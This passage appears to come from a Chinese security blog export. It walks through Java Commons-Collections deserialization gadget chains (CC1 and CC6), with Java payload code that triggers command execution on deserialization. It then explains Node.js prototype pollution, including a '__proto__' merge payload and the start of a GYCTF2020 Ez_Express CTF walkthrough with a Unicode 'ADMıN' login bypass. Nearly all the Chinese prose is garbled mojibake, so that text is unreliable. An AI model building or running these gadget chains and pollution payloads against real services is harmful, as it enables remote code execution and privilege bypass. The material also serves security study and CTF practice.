·ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥æŠŠåœ¨CC1ä¸­ç”ŸæˆChainedTrnasformerå°è£…åˆ°äº†ä¸€ä¸ªç±»çš„é™æ€æ–¹æ³•ä¸­ï¼Œè¿™æ ·åœ¨ä¹‹åçš„é“¾å­ä¸­å¦‚æœç”¨åˆ°äº†ChainedTransformerç›´æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•å³å¯ï¼š\n\nLazyMapæœ‰ä¸¤ä¸ªdecorateæ–¹æ³•å’Œä¸¤ä¸ªæ„é€ å‡½æ•°ï¼Œæˆ‘ä»¬è¦ç”¨çš„æ˜¯æ¥æ”¶mapå’ŒTransformerçš„decorateå’Œæ„é€ å‡½æ•°ï¼š\npublic static Map decorate(Map map, Transformer factory) {    return new LazyMap(map, factory);}protected LazyMap(Map map, Transformer factory) {        super(map);        if (factory == null) {            throw new IllegalArgumentException(\"Factory must not be null\");        }        this.factory = factory;    }\n\npaylaodï¼š\nChainedTransformer ctf = getChain.getChainedTransformer();HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,ctf);\n\nåŠ¨æ€ä»£ç†ï¼š\nChainedTransformer ctf = getChain.getChainedTransformer();HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,ctf);Class AIH = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");Constructor AIHC = AIH.getDeclaredConstructor(Class.class,Map.class);AIHC.setAccessible(true);InvocationHandler AIHCIH = (InvocationHandler) AIHC.newInstance(Override.class,lazymap);Map mapProxy = (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),new Class[]{Map.class},AIHCIH);Object o = AIHC.newInstance(Override.class,mapProxy);serialize(o);unserialize(\"ser.bin\");\n\næˆ‘ä»¬åœ¨å®ä¾‹åŒ–InvocationHandleræ—¶ä¼ å…¥çš„ç¬¬ä¸€ä¸ªæ³¨è§£å‚æ•°ä¸éœ€è¦å†æ˜¯Targetï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»ä¸å†éœ€è¦readObjectä¸­çš„setValueï¼Œè€Œæ˜¯ç›´æ¥åœ¨éå†mapæ—¶åˆ©ç”¨memberValues.entrySet()ã€‚\nCC1çš„ä¸¤æ¡åˆ©ç”¨é“¾:\n\nCommonsCollections6åœ¨jdk8u71ä¸­å¯¹CommonsCollections1åšå‡ºäº†ä¿®å¤ï¼Œä¸»è¦æ˜¯åœ¨AnnotationInvocationHandler.readObjectä¸­åšå‡ºäº†ä¿®æ”¹ï¼Œé’ˆå¯¹checkSetValueé“¾ä¸­ï¼ŒreadObjectä¸­æ•´ä¸ªç§»é™¤äº†å¯¹checkSetValueçš„æ“ä½œï¼Œé’ˆå¯¹LazyMapé“¾åˆ™å°†memberValuesè®¾ç½®ä¸ºäº†å®¢æˆ·ç«¯ä¸å¯æ§ï¼Œè€Œæ˜¯é€šè¿‡ä¸€ä¸ªFiledç±»æ¥è¿›è¡Œè¯»å–ã€‚æˆ‘ä»¬åœ¨å®é™…è¿›è¡Œååºåˆ—åŒ–çš„æ”»å‡»æ—¶ï¼Œå¦‚æœä½¿ç”¨CC1æ¥æ”»å‡»æ—¶ï¼Œä¸€æ—¦jdkç‰ˆæœ¬æ›´æ”¹åŸæœ‰çš„gadgetchainå°±æ— æ³•ä½¿ç”¨ï¼Œè¿™æ ·å¯¹æˆ‘ä»¬çš„æ”»å‡»è¿›è¡Œäº†æå¤§çš„å—é™ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ä¸ªå—jdkç‰ˆæœ¬å½±å“å¯¹çš„gadgetchainå‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹CC6ã€‚\nysoserialä¸­ç»™å‡ºçš„gadgetchainï¼Œå¯ä»¥çœ‹åˆ°é“¾å­ååŠæˆªç›´åˆ°LazyMap.get()å’Œæˆ‘ä»¬CC1çš„LazyMapé“¾æ˜¯ä¸€æ ·çš„ï¼š \n\nå†å¾€ä¸Šçœ‹æˆ‘ä»¬å‘ç°è§¦å‘ç‚¹æ˜¯HashMap.hashï¼Œè¿™é‡Œå’ŒURLDNSä¸­éå¸¸åƒäº†ï¼Œé€šè¿‡å‘HashMapputä¸€ä¸ªé”®å€¼å¯¹ï¼Œé‚£ä¹ˆåœ¨HashMapçš„readobjectä¸­å°±ä¼šå¯¹Mapçš„é”®å€¼å¯¹è¿›è¡Œéå†ï¼Œå¹¶ä¸”å¯¹æ¯ä¸€ä¸ªé”®å€¼å¯¹çš„keyè¿›è¡Œhashï¼Œåœ¨è¿›è¡Œhashæ—¶ä¼šå¯¹keyè¿›è¡ŒhashCodeã€‚\n\næ ¹æ®ä¸Šé¢ysoserialç»™å‡ºçš„gadgetchainï¼Œæˆ‘ä»¬å‘ç°æ‰€éœ€è¦è°ƒç”¨çš„hashCodeçš„ç±»å°±æ˜¯TiedMapEntryï¼Œgadgetchainè¡¥å……å®Œä¹‹åå°±æ˜¯è¿™æ ·äº†ï¼š\n\næˆ‘ä»¬æ¥çœ‹è¿™ä¸ªTiedMapEntryï¼Œå®ƒçš„æ„é€ å‡½æ•°æ¥æ”¶ä¸€ä¸ªMapå’Œä¸€ä¸ªkeyï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç±»å‚¨å­˜çš„é”®å€¼å¯¹æ ¼å¼æ˜¯ Map-keyï¼Œï¼ˆæ³¨æ„è¿™é‡Œkeyåªæ˜¯ä¸€ä¸ªåå­—ï¼Œæˆ‘ä»¬é€šå¸¸è¯´çš„key-valueä¸€èˆ¬æ¥è¯´æ˜¯keyåœ¨å‰ï¼Œvalueåœ¨åï¼Œä½†keyæ˜¯å¦åœ¨å‰æ˜¯ä¸ä¸€å®šçš„ï¼ŒHashMapä¸­ä»¥Key-valueæ ¼å¼å‚¨å­˜é”®å€¼å¯¹ï¼Œé‚£ä¹ˆå¯¹äºHashMapæ¥è¯´åœ¨å‰é¢çš„å°±æ˜¯keyï¼Œè€ŒTiedMapEntryä»¥Map-keyå½¢å¼å‚¨å­˜é”®å€¼å¯¹ï¼Œé‚£ä¹ˆå¯¹å®ƒæ¥è¯´keyå°±åœ¨åé¢ï¼‰æˆ‘ä»¬å°†lazymapæ‰”åˆ°TiedMapEntryä¸­ï¼š\nChainedTransformer ctf = getChain.getChainedTransformer();HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,ctf);TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"123\");\n\nå†å°†tiedMapEntryä½œä¸ºé”®å€¼å‚¨å­˜åˆ°HashMapä¸­ï¼š\nChainedTransformer ctf = getChain.getChainedTransformer();HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,ctf);TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"123\");HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(tiedMapEntry,\"123\");serialize(hashMap);\n\nä½†æ˜¯è¿™é‡Œä¾ç„¶æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœè¿è¡Œä¸€ä¸‹ä¸Šé¢çš„ä»£ç ä¼šå‘ç°æˆ‘æ²¡æœ‰è¿›è¡Œååºåˆ—åŒ–ä¹Ÿå¼¹å‡ºäº†è®¡ç®—å™¨ï¼Œè¿™ä¸ªé—®é¢˜æˆ‘ä»¬åœ¨URLDNSä¸­å°±é‡åˆ°è¿‡ï¼Œå½“åºåˆ—åŒ–æ—¶ï¼Œåœ¨æˆ‘ä»¬puttiedMapEntryæ—¶å°±å·²ç»è§¦å‘äº†hashCodeï¼Œè®¡ç®—å™¨å°±ä¼šå¼¹å‡ºï¼Œå¹¶ä¸æ˜¯é€šè¿‡ååºåˆ—åŒ–æ¥è§¦å‘çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åŠ ä¸€æ®µä»£ç é˜²æ­¢åœ¨putæ—¶å°±å¼¹è®¡ç®—å™¨ï¼Œæˆ‘è¿™é‡Œæ˜¯åœ¨decorateæ—¶ï¼Œä¼ ä¸€ä¸ªæ— æ•ˆçš„Transformerï¼Œputæ—¶å°±ä¸ä¼šå¼¹è®¡ç®—å™¨ï¼Œåœ¨åºåˆ—åŒ–å‰å°†factoré€šè¿‡åå°„ä¿®æ”¹å›å»ï¼Œååºåˆ—åŒ–çš„ç»“æœå°±ä¸ä¼šå—åˆ°å½±å“ï¼š\n        ChainedTransformer ctf = getChain.getChainedTransformer();        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"123\");        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();        hashMap.put(tiedMapEntry,\"123\");        lazyMap.remove(\"123\");        Class c = LazyMap.class;        Field factoryField = c.getDeclaredField(\"factory\");        factoryField.setAccessible(true);        factoryField.set(lazyMap,ctf);//      serialize(hashMap);\t\t\t\tunserialize(\"ser.bin\");\n","categories":["WebSec"],"tags":["Javaååºåˆ—åŒ–"]},{"title":"NodejsåŸå‹é“¾æ±¡æŸ“","url":"/2023/04/21/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","content":"NodejsåŸå‹é“¾æ±¡æŸ“Nodejsä¸JavaScriptå’ŒJSONæœ‰ä¸€äº›äººåœ¨å­¦ä¹ JavaScriptæ—¶ä¼šåˆ†ä¸æ¸…Nodejså’ŒJavaScriptä¹‹é—´çš„åŒºåˆ« å¦‚æœæ²¡æœ‰node é‚£ä¹ˆæˆ‘ä»¬çš„JavaScriptä»£ç åˆ™ç”±æµè§ˆå™¨ä¸­çš„JavaScriptè§£æå™¨è¿›è¡Œè§£æ å‡ ä¹æ‰€æœ‰çš„æµè§ˆå™¨éƒ½é…å¤‡äº†JavaScriptçš„è§£æåŠŸèƒ½ï¼ˆæœ€å‡ºåçš„å°±æ˜¯googleçš„v8ï¼‰ è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬èƒ½åœ¨f12ä¸­ç›´æ¥æ‰§è¡ŒJavaScriptçš„åŸå›   è€ŒNodejsåˆ™æ˜¯ç”±è¿™ä¸ªè§£æå™¨å•ç‹¬ä»æµè§ˆå™¨ä¸­æ‹¿å‡ºæ¥ å¹¶è¿›è¡Œäº†ä¸€ç³»åˆ—çš„å¤„ç† æœ€åæˆä¸ºäº†ä¸€ä¸ªå¯ä»¥åœ¨æœåŠ¡ç«¯è¿è¡ŒJavaScriptçš„ç¯å¢ƒ  è¿™é‡Œçœ‹åˆ°ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ å­¦è¿‡javaçš„å¸ˆå‚…åº”è¯¥å°±æ˜ç™½äº†\n\né‚£ä¹ˆJSONåˆæ˜¯ä»€ä¹ˆå‘¢ ç®€å•æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯JavaScriptçš„å¯¹è±¡è¡¨ç¤ºæ–¹æ³• å®ƒè¡¨ç¤ºçš„æ˜¯å£°æ˜å¯¹è±¡çš„ä¸€ç§æ ¼å¼  ç”±äºæˆ‘ä»¬ä»å‰ç«¯æ¥æ”¶åˆ°çš„æ•°æ®åŸºæœ¬éƒ½æ˜¯å­—ç¬¦ä¸² å› æ­¤åœ¨æœåŠ¡ç«¯å¦‚æœè¦å°†è¿™äº›å­—ç¬¦ä¸²å¤„ç†ä¸ºå…¶ä»–æ ¼å¼ æ¯”å¦‚å¯¹è±¡ å°±éœ€è¦ç”¨åˆ°JSONäº† \n\nåŸå‹å¯¹è±¡ï¼ˆprototypeï¼‰ä¸åŸå‹è¿æ¥ç‚¹ï¼ˆ__proto__ï¼‰ä¸åŸå‹é“¾\nåœ¨c++æˆ–javaè¿™äº›é¢å‘å¯¹è±¡çš„è¯­è¨€ä¸­ æˆ‘ä»¬å¦‚æœæƒ³è¦ä¸€ä¸ªå¯¹è±¡é¦–å…ˆéœ€è¦ä½¿ç”¨å…³é”®å­—classå£°æ˜ä¸€ä¸ªç±» å†ä½¿ç”¨å…³é”®å­—newä¸€ä¸ªå¯¹è±¡å‡ºæ¥ ä½†æ˜¯åœ¨JavaScriptä¸­æ²¡æœ‰class ä»¥åŠç±»è¿™ç§æ¦‚å¿µï¼ˆä¸ºäº†ç®€åŒ–ç¼–å†™JavaScriptä»£ç ï¼ŒECMAScript 6åå¢åŠ äº†classè¯­æ³•ï¼Œä½†classå…¶å®åªæ˜¯ä¸€ä¸ªè¯­æ³•ç³–ï¼‰ åœ¨JavaScriptæœ‰è¿™ä¹ˆä¸¤ç§å£°æ˜å¯¹è±¡çš„æ–¹å¼ ä¸ºäº†å¥½ç†è§£æˆ‘ä»¬å…ˆå¼•å…¥ç±»çš„æ€æƒ³\nperson=new Object()person.firstname=\"John\";person.lastname=\"Doe\";person.age=50;person.eyecolor=\"blue\";è¿™ç§åˆ›å»ºå¯¹è±¡çš„æ–¹æ³•è¿˜æœ‰å¦ä¸€ç§å†™æ³• å¦‚ä¸‹person={firstname:\"John\",lastname:\"Doe\",age:50,eyecolor:\"blue\"};è¿™ç§æ–¹æ³•é€šè¿‡ç›´æ¥å®ä¾‹åŒ–æ„é€ æ–¹æ³•Object()æ¥åˆ›å»ºå¯¹è±¡\n\nfunction person(firstname,lastname,age,eyecolor)  è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªâ€œç±»â€ ä½†æ˜¯åœ¨JavaScriptä¸­å«åšæ„é€ å‡½æ•°æˆ–è€…æ„é€ å™¨{    this.firstname=firstname;    this.lastname=lastname;    this.age=age;    this.eyecolor=eyecolor;}var myFather=new person(\"John\",\"Doe\",50,\"blue\");\té€šè¿‡è¿™ä¸ªâ€œç±»â€å®ä¾‹åŒ–å¯¹è±¡var myMother=new person(\"Sally\",\"Rally\",48,\"green\");è¿™ç§æ–¹æ³•å…ˆåˆ›å»ºæ„é€ å‡½æ•° å†å®ä¾‹åŒ–æ„é€ å‡½æ•° æ„é€ å‡½æ•°functionä¹Ÿå±äºObject å¦‚æœå¯¹è¿™é‡Œä¸ºä»€ä¹ˆå±äºObjectè€Œä¸å±äºFunctionæœ‰ç–‘é—®è¯·ç»§ç»­é˜…è¯» ä¸‹é¢ä¼šè§£é‡Š\n\næ—¢ç„¶æ˜¯é€šè¿‡å®ä¾‹åŒ–Objectæ¥åˆ›å»ºå¯¹è±¡æˆ–åˆ›å»ºæ„é€ å‡½æ•°\n åœ¨JavaScriptä¸­æœ‰ä¸¤ä¸ªå¾ˆç‰¹æ®Šçš„å¯¹è±¡ Function() å’Œ Object()  å®ƒä»¬ä¸¤ä¸ªæ—¢æ˜¯æ„é€ å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ ä½œä¸ºå¯¹è±¡æ˜¯ä¸æ˜¯åº”è¯¥æœ‰ä¸€ä¸ªâ€œç±»â€å»ä½œä¸ºä»–ä»¬çš„æ¨¡æ¿å‘¢\nå¯¹äºObject()æ¥è¯´ è¦å£°æ˜è¿™ä¹ˆä¸€ä¸ªæ„é€ å‡½æ•°æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…³é”®å­—functionæ¥åˆ›å»º ï¼ˆåœ¨åº•å±‚ ä½¿ç”¨functionåˆ›å»ºä¸€ä¸ªå‡½æ•° å…¶å®å°±ç›¸å½“äºè¿™ä¸ªè¿‡ç¨‹ï¼‰ \nfunction Object(){}åœ¨åº•å±‚ä¸ºvar Object = new Function();\n\né‚£ä¹ˆå¯¹äºFunctionè‡ªå·±è¿™ä¸ªå¯¹è±¡ä»–æ˜¯æ€ä¹ˆæ¥çš„å‘¢ å¦‚æœç”¨Function.__proto__å’ŒFunction.prototypeè¿›è¡Œæ¯”è¾ƒå‘ç°äºŒè€…æ˜¯å…¨ç­‰çš„ æ‰€ä»¥Functionåˆ›é€ äº†è‡ªå·± ä¹Ÿåˆ›é€ äº†Object æ‰€ä»¥JavaScriptä¸­ æ‰€æœ‰å‡½æ•°éƒ½æ˜¯å¯¹è±¡ è€Œå¯¹è±¡æ˜¯é€šè¿‡å‡½æ•°åˆ›å»ºçš„ å› æ­¤æ„é€ å‡½æ•°.prototype.__proto__ åº”è¯¥æ˜¯Object.prototype è€Œä¸æ˜¯Function.prototype   Functionçš„ä½œç”¨æ˜¯åˆ›å»ºè€Œä¸æ˜¯ç»§æ‰¿\n\n\né‚£ä¹ˆæåˆ°äº†__proto__å’Œprototypeæˆ‘ä»¬å°±æ¥è¯´è¯´è¿™ä¸¤ä¸ªæ˜¯ä»€ä¹ˆä¸œè¥¿\né¦–å…ˆæˆ‘ä»¬è¦äº†è§£ä»¥ä¸‹æ¦‚å¿µ\n\n__proto__æ˜¯ä»»ä½•ä¸€ä¸ªå¯¹è±¡æ‹¥æœ‰çš„å±æ€§    prototypeæ˜¯ä»»ä½•ä¸€ä¸ªå‡½æ•°æ‹¥æœ‰çš„ä¸€ä¸ªå±æ€§  \n\næ¯”å¦‚\nperson={firstname:\"John\",lastname:\"Doe\",age:50,eyecolor:\"blue\"};\n\né‚£ä¹ˆè¿™ä¸ªpersonå¯¹è±¡å°±æ‹¥æœ‰äº†person.__proto__è¿™ä¸ªå±æ€§ è€ŒObject()æˆ‘ä»¬åˆšæ‰æåˆ°äº†æ˜¯ç”±Functionåˆ›å»ºæ¥çš„ä¸€ä¸ªæ„é€ å‡½æ•° é‚£ä¹ˆObjectå°±å¤©ç”Ÿæœ‰äº†Object.prototype \n\næŸä¸€å¯¹è±¡çš„ __proto__æŒ‡å‘å®ƒçš„prototypeï¼ˆåŸå‹å¯¹è±¡ï¼‰ ä¹Ÿå°±æ˜¯è¯´å¦‚æœç›´æ¥è®¿é—®person.__proto__ é‚£ä¹ˆå°±ç›¸å½“äºè®¿é—®äº†Object.prototype\nJavaScriptä½¿ç”¨prototypeé“¾å®ç°ç»§æ‰¿æœºåˆ¶\næ„é€ å‡½æ•°xxx.prototypeæ˜¯ä¸€ä¸ªå¯¹è±¡ xxx.prototypeä¹Ÿæœ‰è‡ªå·±çš„__proto__å±æ€§ å¹¶ä¸”å¯ä»¥ç»§ç»­æŒ‡å‘å®ƒçš„çš„prototype\nObject.prototype.protoæœ€ç»ˆæŒ‡å‘null è¿™ä¹Ÿæ˜¯æ‰€æœ‰åŸå‹é“¾çš„ç»ˆç‚¹\nä»ä¸€ä¸ªå¯¹è±¡çš„__proto__ä¸æ–­å‘ä¸ŠæŒ‡å‘åŸå‹å¯¹è±¡æœ€ç»ˆæŒ‡å‘Objecct.prototypeåæ¥ç€æŒ‡å‘ä¸ºNull è¿™ä¸€æ¡é“¾å­å°±å«åšåŸå‹é“¾\n\næœ‰æ¡ä»¶çš„å¸ˆå‚…ä¹Ÿå¯ä»¥æŠŠä¸‹é¢çš„è§†é¢‘åˆé›†çœ‹ä¸€ä¸‹ å¯¹ç†è§£åŸå‹å’ŒåŸå‹é“¾æœ‰å¾ˆå¤§çš„å¸®åŠ©\n4_Functionä¸Objectçš„ç‰¹æ®Šæ€§_å“”å“©å“”å“©_bilibili\n å¦‚æœæˆ‘ä»¬æœ‰å¦‚ä¸‹ä»£ç ï¼š\nfunction Father() {    this.first_name = 'Donald'    this.last_name = 'Trump'}function Son() {    this.first_name = 'Melania'}Son.prototype = new Father()let son = new Son()console.log(`Name: ${son.first_name} ${son.last_name}`)\n\né‚£ä¹ˆæŒ‰ç…§ä¸Šè¿°è¯´æ³• å°±æœ‰å¦‚ä¸‹ç»“æ„\n\nå¯¹äºå¯¹è±¡sonï¼Œåœ¨è°ƒç”¨son.last_nameçš„æ—¶å€™ï¼Œå®é™…ä¸ŠJavaScriptå¼•æ“ä¼šè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š\n\nåœ¨å¯¹è±¡sonä¸­å¯»æ‰¾last_name\nå¦‚æœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨son.__proto__ä¸­å¯»æ‰¾last_name\nå¦‚æœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨son.__proto__.__proto__ä¸­å¯»æ‰¾last_name\nä¾æ¬¡å¯»æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°nullç»“æŸã€‚\n\nåŸå‹é“¾æ±¡æŸ“ä¸¾ä¸ªæ —å­\n// è¿™ä¸ªå¯¹è±¡ç›´æ¥å®ä¾‹åŒ–Object()let foo = {bar: 1}// foo.bar æ­¤æ—¶ä¸º1console.log(foo.bar)// ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰foo.__proto__.bar = 2// ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1console.log(foo.bar)// æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡let zoo = {}// æŸ¥çœ‹zoo.barconsole.log(zoo.bar)\n\n\nè¿™é‡Œç”±äºä¿®æ”¹äº†foo.__proto__.bar ä¹Ÿå°±æ˜¯ä¿®æ”¹äº†Object.bar å› æ­¤åœ¨åç»­çš„å®ä¾‹åŒ–å¯¹è±¡ä¸­ æ–°çš„å¯¹è±¡ä¼šç»§æ‰¿è¿™ä¸€å±æ€§ é€ æˆäº†åŸå‹é“¾æ±¡æŸ“\nåœ¨å®é™…åº”ç”¨ä¸­ï¼Œå“ªäº›æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨åŸå‹é“¾èƒ½è¢«æ”»å‡»è€…ä¿®æ”¹çš„æƒ…å†µå‘¢ï¼Ÿ\næˆ‘ä»¬æ€è€ƒä¸€ä¸‹ï¼Œå“ªäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è®¾ç½®__proto__çš„å€¼å‘¢ï¼Ÿå…¶å®æ‰¾æ‰¾èƒ½å¤Ÿæ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œå³å¯\nçœ‹ä¸‹é¢ä»£ç  ä¸€ä¸ªç®€å•çš„å¯¹è±¡clone\nfunction merge(target, source) {    for (let key in source) {        if (key in source &amp;&amp; key in target) {              // å¦‚æœtargetä¸sourceæœ‰ç›¸åŒçš„é”®å åˆ™è®©targetçš„é”®å€¼ä¸ºsourceçš„é”®å€¼            merge(target[key], source[key])        } else {            target[key] = source[key]  // å¦‚æœtargetä¸sourceæ²¡æœ‰ç›¸é€šçš„é”®å åˆ™ç›´æ¥åœ¨targetæ–°å»ºé”®åå¹¶èµ‹ç»™é”®å€¼        }    }}let o1 = {}let o2 = {a: 1, \"__proto__\": {b: 2}}merge(o1, o2)console.log(o1.a, o1.b)o3 = {}console.log(o3.b)\n\n\nè¿™é‡Œæ‰§è¡Œåå‘ç° è™½ç„¶ä¸¤ä¸ªå¯¹è±¡æˆåŠŸclone ä½†æ˜¯Object()å¹¶æ²¡ç”¨è¢«æ±¡æŸ“ è¿™æ˜¯å› ä¸ºåœ¨åˆ›å»ºo2æ—¶ __proto__æ˜¯å·²ç»å­˜åœ¨äºo2ä¸­çš„å±æ€§äº† è§£æå™¨å¹¶ä¸èƒ½å°†è¿™ä¸ªå±æ€§è§£æä¸ºé”®å€¼ æ‰€ä»¥è¦ç”¨JSONå»ä¿®æ”¹ä»£ç ï¼ˆå‰é¢æˆ‘ä»¬è¯´äº† JSONæ˜¯JavaScriptçš„å¯¹è±¡è¡¨ç¤ºæ–¹æ³• å¯ä»¥å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹è±¡ï¼‰ è¿™æ ·å°±å¯ä»¥ä½¿__proto__è¢«æˆåŠŸè§£ææˆé”®åäº†\nlet o1 = {}let o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')merge(o1, o2)console.log(o1.a, o1.b)o3 = {}console.log(o3.b)\n\n\næ¼æ´å¤ç°[GYCTF2020]Ez_Expressè¿›å…¥ç¯å¢ƒä¹‹åæ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ æµ‹è¯•ä¹‹åå‘ç°å­˜åœ¨www.zipæºç æ³„éœ² å¼€å§‹å®¡è®¡index.js\nvar express = require('express');var router = express.Router();const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; {  for (var attr in b) {    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) {      merge(a[attr], b[attr]);    } else {      a[attr] = b[attr];    }  }  return a}const clone = (a) =&gt; {  return merge({}, a);}function safeKeyword(keyword) {  if(keyword.match(/(admin)/is)) {      return keyword  }  return undefined}router.get('/', function (req, res) {  if(!req.session.user){    res.redirect('/login');  }  res.outputFunctionName=undefined;  res.render('index',data={'user':req.session.user.user});});router.get('/login', function (req, res) {  res.render('login');});router.post('/login', function (req, res) {  if(req.body.Submit==\"register\"){   if(safeKeyword(req.body.userid)){    res.end(\"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;\")    }    req.session.user={      'user':req.body.userid.toUpperCase(),      'passwd': req.body.pwd,      'isLogin':false    }    res.redirect('/');   }  else if(req.body.Submit==\"login\"){    if(!req.session.user){res.end(\"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;\")}    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd){      req.session.user.isLogin=true;    }    else{      res.end(\"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;\")    }    }  res.redirect('/'); ;});router.post('/action', function (req, res) {  if(req.session.user.user!=\"ADMIN\"){res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\")}   req.session.user.data = clone(req.body);  res.end(\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\");  });router.get('/info', function (req, res) {  res.render('index',data={'user':res.outputFunctionName});})module.exports = router;\n\nçœ‹ä¸‹é¢ä¸¤æ®µä»£ç \nfunction safeKeyword(keyword) {  if(keyword.match(/(admin)/is)) {      return keyword  }  return undefined}\n\nrouter.post('/login', function (req, res) {  if(req.body.Submit==\"register\"){   if(safeKeyword(req.body.userid)){    res.end(\"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;\")    }    req.session.user={      'user':req.body.userid.toUpperCase(),      'passwd': req.body.pwd,      'isLogin':false    }    res.redirect('/');   }  else if(req.body.Submit==\"login\"){    if(!req.session.user){res.end(\"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;\")}    if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd){      req.session.user.isLogin=true;    }    else{      res.end(\"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;\")    }    }  res.redirect('/'); ;});\n\nåªæœ‰ç”¨adminç™»å½•æ‰ä¼šreturn keyword å¦åˆ™è¿”å›undefined è¿”å›undefinedå°±ä¼šå¼¹çª—forbid word å¦‚æœusernameç»è¿‡toUpperCaseåä¸èƒ½ä¸åŸæ¥çš„åŒ¹é… æˆ–passwordé”™è¯¯ å°±ä¼šå¼¹çª—error passwd è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆé¢˜ä¸­è¯´ç”¨æˆ·ååªæ”¯æŒå¤§å†™\nå†çœ‹è¿™æ®µ å°±å¾ˆæ¶å¿ƒ å¦‚æœusernameä¸ºADMINå°±ä¸èƒ½ç™»å½• åˆä¸è®©ç”¨admin åˆå¾—ç”¨adminç™»å½• è¿™é‡Œå°±ç”¨åˆ°äº†JavaScriptå¤§å°å†™çš„æ¼æ´\nåŸç†ç§»æ­¥pç¥åšå®¢ Fuzzä¸­çš„javascriptå¤§å°å†™ç‰¹æ€§ | ç¦»åˆ«æ­Œ (leavesongs.com)\nif(req.session.user.user!=\"ADMIN\"){res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\")} \n\næ‰€ä»¥ç”¨ADMÄ±Næ¥ç»•è¿‡ æ³¨æ„ä¸æ˜¯ADMiN ä¸­é—´é‚£ä¸ªiæ˜¯ä¸€ä¸ªå¥‡æ€ªçš„å­—ç¬¦ æŠŠusernameè¾“å…¥ADMÄ±Nç›´æ¥æ³¨å†Œå°±å¯ä»¥äº†ï¼ˆé¢˜ç›®ç¯å¢ƒæ€ªæ€ªçš„ æœ‰çš„æ—¶å€™ADMÄ±N ä¸è¡Œå°±è¯•è¯•admÄ±nï¼‰ç™»å½•è¿›å»è¿˜ç»™äº†flagçš„ä½ç½®\n\n\nè¿™é‡Œè¯•äº†è¯•æ²¡å•¥ç”¨ ç»§ç»­çœ‹æºç  ä¸Šé¢æåˆ°äº† merge cloneæ“ä½œå¯ä»¥æ§åˆ¶é”®å€¼å’Œé”®å ä»è€Œè¾¾åˆ°æ±¡æŸ“\nconst merge = (a, b) =&gt; {  for (var attr in b) {    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) {      merge(a[attr], b[attr]);    } else {      a[attr] = b[attr];    }  }  return a}const merge = (a, b) =&gt; {  for (var attr in b) {    if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) {      merge(a[attr], b[attr]);    } else {      a[attr] = b[attr];    }  }\n\nå¾€ä¸‹çœ‹æ‰¾åˆ°è°ƒç”¨cloneçš„ä½ç½®\nrouter.post('/action', function (req, res) {  if(req.session.user.user!=\"ADMIN\"){res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\")}   req.session.user.data = clone(req.body);  